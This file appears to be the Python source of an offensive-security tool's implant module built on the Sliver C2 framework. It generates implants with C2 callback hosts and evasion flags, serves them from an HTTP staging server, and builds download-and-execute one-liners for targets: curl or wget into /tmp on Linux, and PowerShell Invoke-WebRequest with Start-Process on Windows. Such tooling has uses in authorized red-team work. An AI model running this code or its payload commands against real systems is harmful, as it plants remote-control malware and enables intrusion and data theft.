"""Sliver implant generation and management."""

import hashlib
import http.server
import logging
import random
import socket
import socketserver
import threading
import uuid
from datetime import datetime
from pathlib import Path
from typing import Any

from ..exceptions import CommandExecutionError
from ..models import ImplantConfig, ImplantInfo, StagingServer

logger = logging.getLogger(__name__)


class ImplantGenerator:
    """Sliver implant generator and manager."""

    def __init__(self, sliver_client: Any, work_dir: Path | None = None):
        """Initialize implant generator.

        Args:
            sliver_client: Sliver client instance
            work_dir: Working directory for implants (default: ~/.wish/implants)
        """
        self.client = sliver_client
        self.work_dir = work_dir or Path.home() / ".wish" / "implants"
        self.work_dir.mkdir(parents=True, exist_ok=True)

        # Track generated implants
        self._implants: dict[str, ImplantInfo] = {}

        # Track staging servers
        self._staging_servers: dict[str, tuple[StagingServer, socketserver.TCPServer]] = {}

    async def generate_implant(self, config: ImplantConfig) -> ImplantInfo:
        """Generate a new Sliver implant.

        Args:
            config: Implant configuration

        Returns:
            Generated implant information

        Raises:
            CommandExecutionError: If generation fails
        """
        try:
            # Auto-generate name if not provided
            if not config.name:
                config.name = self._generate_implant_name()

            # Determine output format and extension
            extension = self._get_extension(config.os, config.format)
            output_path = self.work_dir / f"{config.name}{extension}"

            logger.info(f"Generating implant '{config.name}' for {config.os}/{config.arch}")

            # Build Sliver protobuf configuration
            from sliver.pb import clientpb

            # Create ImplantConfig protobuf object
            implant_config = clientpb.client_pb2.ImplantConfig()
            implant_config.Name = config.name
            implant_config.GOOS = config.os
            implant_config.GOARCH = config.arch

            # Set format flags based on format type
            if config.format == "exe":
                implant_config.Format = clientpb.client_pb2.OutputFormat.EXECUTABLE
            elif config.format == "shellcode":
                implant_config.Format = clientpb.client_pb2.OutputFormat.SHELLCODE
                implant_config.IsShellcode = True
            elif config.format == "shared":
                implant_config.Format = clientpb.client_pb2.OutputFormat.SHARED_LIB
                implant_config.IsSharedLib = True
            elif config.format == "service":
                implant_config.Format = clientpb.client_pb2.OutputFormat.SERVICE
                implant_config.IsService = True
            else:
                implant_config.Format = clientpb.client_pb2.OutputFormat.EXECUTABLE

            # Set other flags
            implant_config.ObfuscateSymbols = config.skip_symbols
            implant_config.Evasion = config.obfuscate
            implant_config.ReconnectInterval = config.reconnect_interval
            implant_config.MaxConnectionErrors = config.max_connection_errors

            # Configure C2
            c2_config = implant_config.C2.add()
            c2_config.Priority = 1
            c2_config.URL = f"{config.protocol}://{config.callback_host}:{config.callback_port}"

            # Generate implant via Sliver
            result = await self.client.generate_implant(implant_config)

            # Save implant to file
            implant_data = result.File.Data
            output_path.write_bytes(implant_data)

            # Calculate hash
            sha256_hash = hashlib.sha256(implant_data).hexdigest()

            # Create implant info
            implant_info = ImplantInfo(
                id=str(uuid.uuid4()),
                name=config.name,
                file_path=str(output_path),
                size=len(implant_data),
                hash_sha256=sha256_hash,
                config=config,
                generated_at=datetime.now(),
            )

            # Track implant
            self._implants[implant_info.id] = implant_info

            logger.info(
                f"Successfully generated implant '{config.name}' "
                f"({implant_info.size:,} bytes, SHA256: {sha256_hash[:16]}...)"
            )

            return implant_info

        except Exception as e:
            logger.error(f"Failed to generate implant: {e}")
            raise CommandExecutionError(f"Implant generation failed: {e}") from e

    def _generate_implant_name(self) -> str:
        """Generate a random implant name."""
        # Sliver-style names (ADJECTIVE_NOUN_TIMESTAMP)
        adjectives = ["FANCY", "HONEST", "BRAVE", "QUICK", "SILENT", "DEADLY", "SHARP", "SWIFT", "CLEVER", "STRONG"]
        nouns = ["TIGER", "WIZARD", "DRAGON", "PHOENIX", "HAWK", "WOLF", "EAGLE", "BEAR", "SNAKE", "FALCON"]

        import random  # noqa: S311
        import time

        # Add timestamp to ensure uniqueness
        timestamp = str(int(time.time()))[-6:]  # Last 6 digits of timestamp
        return f"{random.choice(adjectives)}_{random.choice(nouns)}_{timestamp}"  # noqa: S311

    def _get_extension(self, os: str, format: str) -> str:
        """Get file extension for implant."""
        if os == "windows":
            if format == "exe":
                return ".exe"
            elif format == "service":
                return ".exe"
            elif format == "shared":
                return ".dll"
            elif format == "shellcode":
                return ".bin"
        elif os == "linux":
            if format == "exe":
                return ""
            elif format == "shared":
                return ".so"
            elif format == "shellcode":
                return ".bin"
        elif os == "darwin":
            if format == "exe":
                return ""
            elif format == "shared":
                return ".dylib"
            elif format == "shellcode":
                return ".bin"

        return ".bin"

    async def list_implants(self) -> list[ImplantInfo]:
        """List all generated implants.

        Returns:
            List of implant information
        """
        return list(self._implants.values())

    async def delete_implant(self, implant_id: str) -> bool:
        """Delete a generated implant.

        Args:
            implant_id: Implant identifier

        Returns:
            True if successful
        """
        if implant_id not in self._implants:
            logger.warning(f"Implant {implant_id} not found")
            return False

        implant = self._implants[implant_id]

        # Delete file
        try:
            Path(implant.file_path).unlink(missing_ok=True)
        except Exception as e:
            logger.error(f"Failed to delete implant file: {e}")

        # Remove from tracking
        del self._implants[implant_id]

        logger.info(f"Deleted implant {implant.name} ({implant_id})")
        return True

    async def start_staging_server(self, host: str = "0.0.0.0", port: int | None = None) -> StagingServer:  # noqa: S104
        """Start HTTP server for implant staging.

        Args:
            host: Bind address
            port: Bind port (if None, random port 49152-65535 will be used)

        Returns:
            Staging server information

        Raises:
            CommandExecutionError: If server fails to start
        """
        try:
            # Use random port if not specified
            if port is None:
                port = self._find_available_port()
            server_id = str(uuid.uuid4())

            # Create HTTP server handler with proper directory binding
            class ImplantHTTPHandler(http.server.SimpleHTTPRequestHandler):
                serving_directory: str | None = None  # Will be set before instantiation

                def __init__(self, *args, **kwargs) -> None:
                    # Serve from implants directory
                    super().__init__(*args, directory=self.serving_directory, **kwargs)

                def log_message(self, format: str, *args) -> None:
                    # Custom logging
                    logger.debug(f"Staging server: {format % args}")

            # Set the serving directory
            ImplantHTTPHandler.serving_directory = str(self.work_dir)

            # Create server
            httpd = socketserver.TCPServer((host, port), ImplantHTTPHandler)
            httpd.allow_reuse_address = True

            # Start server in thread
            server_thread = threading.Thread(target=httpd.serve_forever, daemon=True, name=f"staging-server-{port}")
            server_thread.start()

            # Create test file for connectivity testing
            test_file_path = self.work_dir / "test.txt"
            test_file_path.write_text("wish staging server test file\n")

            # Build implant URLs
            implant_urls = {}
            base_url = f"http://{host if host != '0.0.0.0' else 'localhost'}:{port}"  # noqa: S104

            for implant in self._implants.values():
                filename = Path(implant.file_path).name
                implant_urls[implant.name] = f"{base_url}/{filename}"

            # Create server info
            server_info = StagingServer(
                id=server_id,
                protocol="http",
                host=host,
                port=port,
                serving_path=str(self.work_dir),
                implant_urls=implant_urls,
                started_at=datetime.now(),
                status="running",
            )

            # Track server
            self._staging_servers[server_id] = (server_info, httpd)

            logger.info(f"Started staging server at {base_url}")
            return server_info

        except Exception as e:
            logger.error(f"Failed to start staging server: {e}")
            raise CommandExecutionError(f"Staging server failed to start: {e}") from e

    async def stop_staging_server(self, server_id: str) -> bool:
        """Stop staging server.

        Args:
            server_id: Server identifier

        Returns:
            True if successful
        """
        if server_id not in self._staging_servers:
            logger.warning(f"Staging server {server_id} not found")
            return False

        server_info, httpd = self._staging_servers[server_id]

        try:
            # Shutdown server
            httpd.shutdown()
            httpd.server_close()

            # Remove from tracking
            del self._staging_servers[server_id]

            logger.info(f"Stopped staging server on port {server_info.port}")
            return True

        except Exception as e:
            logger.error(f"Failed to stop staging server: {e}")
            return False

    async def list_staging_servers(self) -> list[StagingServer]:
        """List active staging servers.

        Returns:
            List of staging servers
        """
        return [server for server, _ in self._staging_servers.values()]

    def get_implant_download_command(
        self, implant_info: ImplantInfo, staging_url: str, target_os: str = "linux"
    ) -> str:
        """Generate command to download and execute implant on target.

        Args:
            implant_info: Implant information
            staging_url: URL where implant is staged
            target_os: Target operating system

        Returns:
            Command to download and execute implant
        """
        filename = Path(implant_info.file_path).name

        if target_os == "linux":
            # Linux one-liner
            return f"curl -sSL {staging_url} -o /tmp/{filename} && chmod +x /tmp/{filename} && /tmp/{filename} &"
        elif target_os == "windows":
            # Windows PowerShell one-liner
            return (
                f"powershell -c \"Invoke-WebRequest -Uri '{staging_url}' "
                f"-OutFile 'C:\\Windows\\Temp\\{filename}'; "
                f"Start-Process 'C:\\Windows\\Temp\\{filename}'\""
            )
        else:
            # Generic wget
            return f"wget -q {staging_url} -O /tmp/{filename} && chmod +x /tmp/{filename} && /tmp/{filename} &"

    def _find_available_port(self, start: int = 49152, end: int = 65535) -> int:
        """Find an available port in the given range.

        Args:
            start: Start of port range
            end: End of port range

        Returns:
            Available port number

        Raises:
            CommandExecutionError: If no port is available
        """
        # Try random ports first
        for _ in range(100):
            port = random.randint(start, end)  # noqa: S311
            if self._is_port_available(port):
                return port

        # Fallback to sequential search
        for port in range(start, end + 1):
            if self._is_port_available(port):
                return port

        raise CommandExecutionError(f"No available port found in range {start}-{end}")

    def _is_port_available(self, port: int) -> bool:
        """Check if a port is available.

        Args:
            port: Port number to check

        Returns:
            True if port is available
        """
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            try:
                sock.bind(("", port))
                return True
            except OSError:
                return False
